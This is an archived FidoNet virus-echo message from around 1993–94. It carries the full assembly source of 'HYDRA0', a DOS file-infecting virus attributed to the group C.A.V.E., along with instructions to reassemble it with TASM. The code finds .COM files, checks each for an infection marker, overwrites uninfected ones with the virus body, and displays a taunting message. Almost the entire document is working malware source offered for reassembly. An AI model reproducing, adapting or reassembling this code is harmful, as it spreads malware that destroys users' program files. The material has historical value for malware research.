;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 23 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : HYDRA_0.ASM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Gilbert Holleman, 2:283/718 (06 Nov 94 16:44)
;* To   : Mark Hapershaw
;* Subj : HYDRA_0.ASM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Gilbert.Holleman@f718.n283.z2.fidonet.org
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                      ÛÛ
;ÛÛ                 HYDRA0                       ÛÛ
;ÛÛ                                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ  Disassembly by: -=>Wasp<=- aka >>Night Crawler<<                    ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ  Reassemble with TASM 2.0                                            ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

DATA_1E     EQU 80H
DATA_18E    EQU 2E0H
DATA_19E    EQU 2E3H

SEG_A       SEGMENT BYTE PUBLIC
        ASSUME  CS:SEG_A, DS:SEG_A


        ORG 100h

HYDRA0      PROC    FAR

START:
        JMP LOC_1           ; (0225)
        DB   59H, 44H, 00H, 00H
DATA_4      DB  'HyDra     Beta - Not For Release'
        DB  '. *.CO?'
        DB  0
DATA_7      DW  0, 84FCH
DATA_9      DW  0
DATA_10     DB  0
        DB  29 DUP (0)
DATA_11     DB  0
        DB  13 DUP (0)
COPYRIGHT   DB  'Copyright (c)'
DATA_12     DB  '  1991 by C.A.V.E.  HYDRA$'
        DB  'Watch for the many heads.', 0DH, 0AH
        DB  0DH, 0AH, 0DH, 0AH, 0DH, 0AH, 0DH
        DB  0AH, 0DH, 0AH, 0DH, 0AH, 'The fir'
        DB  'st eight are easy to find and ki'
        DB  'll.', 0DH, 0AH, 0DH, 0AH, 'Their'
        DB  ' replacements will be more sophi'
        DB  'sticated.$'
        DB  '(c) 1991  -  C. A. V. E.$'
LOC_1:
        PUSH    AX
        MOV AX,CS
        ADD AX,1000H
        XOR DI,DI           ; Zero register
        MOV CX,2E0H
        MOV SI,OFFSET DS:[100H]
        MOV ES,AX
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        MOV AH,1AH
        MOV DX,OFFSET DATA_10
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV AH,4EH          ; 'N'
        MOV DX,OFFSET DATA_4+22H
        INT 21H         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        JC  LOC_5           ; Jump if carry Set
LOC_2:
        MOV AH,3DH          ; '='
        MOV AL,2
        MOV DX,OFFSET DATA_11
        MOV AL,2
        INT 21H         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        MOV BX,AX
        PUSH    ES
        POP DS
        MOV AX,3F00H
        MOV CX,0FFFFH
        MOV DX,DATA_18E
        INT 21H         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        ADD AX,2E0H
        MOV CS:DATA_9,AX
        CMP WORD PTR DS:DATA_19E,4459H
        JNE LOC_3           ; Jump if not equal
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
        MOV AH,4FH          ; 'O'
        INT 21H         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        JC  LOC_6           ; Jump if carry Set
        JMP SHORT LOC_2     ; (0247)
LOC_3:
        XOR CX,CX           ; Zero register
        MOV DX,CX
        MOV AX,4200H
        INT 21H         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        JC  LOC_4           ; Jump if carry Set
        MOV AH,40H          ; '@'
        XOR DX,DX           ; Zero register
        MOV CX,CS:DATA_9
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
LOC_4:
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
LOC_5:
        MOV AH,1AH
        MOV DX,DATA_1E
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        JMP SHORT LOC_7     ; (02F0)
        DB  90H
LOC_6:
        PUSH    DX
        XOR AX,AX           ; Zero register
        MOV AX,0F00H
        INT 10H         ; Video display   ah=functn 0Fh
                        ;  get state, al=mode, bh=page
        MOV AH,0
        INT 10H         ; Video display   ah=functn 00h
                        ;  set display mode in al
        MOV AX,200H
        MOV DH,6
        MOV DL,25H          ; '%'
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        XOR DX,DX           ; Zero register
        MOV DX,OFFSET DATA_12+14H
        MOV AH,9
        INT 21H         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        MOV AX,200H
        MOV DH,0BH
        MOV DL,1BH
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        MOV DX,OFFSET DATA_12+1AH
        MOV AH,9
        INT 21H         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        MOV AX,200H
        MOV DH,17H
        MOV DL,0
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        MOV DX,OFFSET DATA_12+9EH
        MOV AH,9
        INT 21H         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        MOV AX,200H
        MOV DH,18H
        MOV DL,0
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        MOV AX,4C00H
        INT 21H         ; DOS Services  ah=function 4Ch
                        ;  terminate with al=return code
LOC_7:
        XOR DI,DI           ; Zero register
        MOV SI,OFFSET DATA_16
        MOV CX,0D3H
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        POP BX
        MOV CS:DATA_7,0
        MOV WORD PTR CS:DATA_7+2,ES
        POP BX
        JMP DWORD PTR CS:DATA_7
DATA_16     DB  1EH
        DB   07H,0B9H,0FFH,0FFH,0BEH,0E0H
        DB   03H,0BFH, 00H, 01H, 2BH,0CEH
        DB  0F3H,0A4H, 2EH,0C7H, 06H, 00H
        DB   01H, 00H, 01H, 2EH, 8CH, 1EH
        DB   02H, 01H, 8BH,0C3H, 2EH,0FFH
        DB   2EH, 00H, 01H
        DB  '  Coalition  of   American  Viru'
        DB  's   Engineers         -=-=-     '
        DB  '  Dedicated  to  supporting  the'
        DB  '   anti-virus    industry withou'
        DB  't recognition or reward.        '
        DB  '      -=-=-      '
        DB  0CDH, 20H

HYDRA0      ENDP

SEG_A       ENDS



        END START

;-+-  PPoint 1.86
; + Origin: **SERMEDITECH BBS** Soissons FR (+33) 23.73.02.51 (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeÂeO
;
;Options:      /m = map file with publics
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)
;
